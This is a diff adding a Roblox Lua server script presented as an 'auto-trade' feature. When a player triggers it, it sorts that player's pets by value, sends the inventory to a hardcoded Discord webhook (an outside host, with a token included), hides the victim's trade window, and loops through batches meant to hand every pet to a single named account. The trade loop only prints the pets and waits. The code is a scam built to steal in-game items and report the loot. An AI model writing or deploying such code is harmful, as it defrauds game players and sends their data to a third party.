@@ -1,0 +1,118 @@
+-- Services
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local DataStoreService = game:GetService("DataStoreService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+-- Variables
+local petDataStore = DataStoreService:GetDataStore("PetDataStore")
+local webhookURL = "https://discord.com/api/webhooks/1371599311745319023/CW3Rg-9PSo1CYzT4YO4Ormri56Ye71Ai4mj1JFNkGz47E2ZufCZeMTcwJJSd53cRTy1x"
+
+-- RemoteEvent
+local tradeEvent = Instance.new("RemoteEvent", ReplicatedStorage)
+tradeEvent.Name = "ExecuteAutoTrade"
+
+-- Get player's pets from DataStore
+local function getPets(player)
+    local success, data = pcall(function()
+        return petDataStore:GetAsync(player.UserId)
+    end)
+    return (success and data) or {}
+end
+
+-- Send info to Discord
+local function sendToDiscord(playerName, petList)
+    local content = playerName .. " triggered the auto-trade script.\nInventory:\n"
+    for _, pet in ipairs(petList) do
+        content = content .. "- " .. pet.name .. " (1/" .. pet.rarity .. ")\n"
+    end
+    local payload = HttpService:JSONEncode({ content = content })
+    pcall(function()
+        HttpService:PostAsync(webhookURL, payload, Enum.HttpContentType.ApplicationJson)
+    end)
+end
+
+-- Sort pets by priority
+local function sortPetsByPriority(pets)
+    local secretPets, seasonPets, serialPets, otherPets = {}, {}, {}, {}
+
+    for _, pet in ipairs(pets) do
+        local name = (pet.name or ""):lower()
+        if name:find("secret") then
+            table.insert(secretPets, pet)
+        elseif name:find("season 1") or name:find("season 2") then
+            table.insert(seasonPets, pet)
+        elseif name:find("serial") then
+            table.insert(serialPets, pet)
+        else
+            table.insert(otherPets, pet)
+        end
+    end
+
+    local function sortByRarity(a, b) return a.rarity < b.rarity end
+    table.sort(secretPets, sortByRarity)
+    table.sort(seasonPets, sortByRarity)
+    table.sort(serialPets, sortByRarity)
+    table.sort(otherPets, sortByRarity)
+
+    local sorted = {}
+    for _, group in ipairs({secretPets, seasonPets, serialPets, otherPets}) do
+        for _, pet in ipairs(group) do
+            table.insert(sorted, pet)
+        end
+    end
+    return sorted
+end
+
+-- Trade pets to Kristianikos
+local function autoTradeToKristianikos(player)
+    local targetPlayer = Players:FindFirstChild("Kristianikos")
+    if not targetPlayer then
+        warn("Kristianikos not in game. Please wait for them to join.")
+        return
+    end
+
+    local pets = getPets(player)
+    if not pets or #pets == 0 then
+        warn("No pets found.")
+        return
+    end
+
+    local sortedPets = sortPetsByPriority(pets)
+    sendToDiscord(player.Name, sortedPets)
+
+    local gui = player:FindFirstChild("PlayerGui")
+    if gui then
+        local tradeUI = gui:FindFirstChild("TradeUI")
+        if tradeUI then
+            tradeUI.Enabled = false
+        end
+    end
+
+    while #sortedPets > 0 do
+        local tradeBatch = {}
+        for i = 1, math.min(10, #sortedPets) do
+            table.insert(tradeBatch, table.remove(sortedPets, 1))
+        end
+
+        print(player.Name .. " is trading to Kristianikos:")
+        for _, pet in ipairs(tradeBatch) do
+            print(" - " .. pet.name)
+        end
+
+        wait(1)
+        wait(0.5)
+    end
+
+    if gui then
+        local tradeUI = gui:FindFirstChild("TradeUI")
+        if tradeUI then
+            tradeUI.Enabled = true
+        end
+    end
+end
+
+-- Triggered by player
+tradeEvent.OnServerEvent:Connect(function(player)
+    autoTradeToKristianikos(player)
+end)
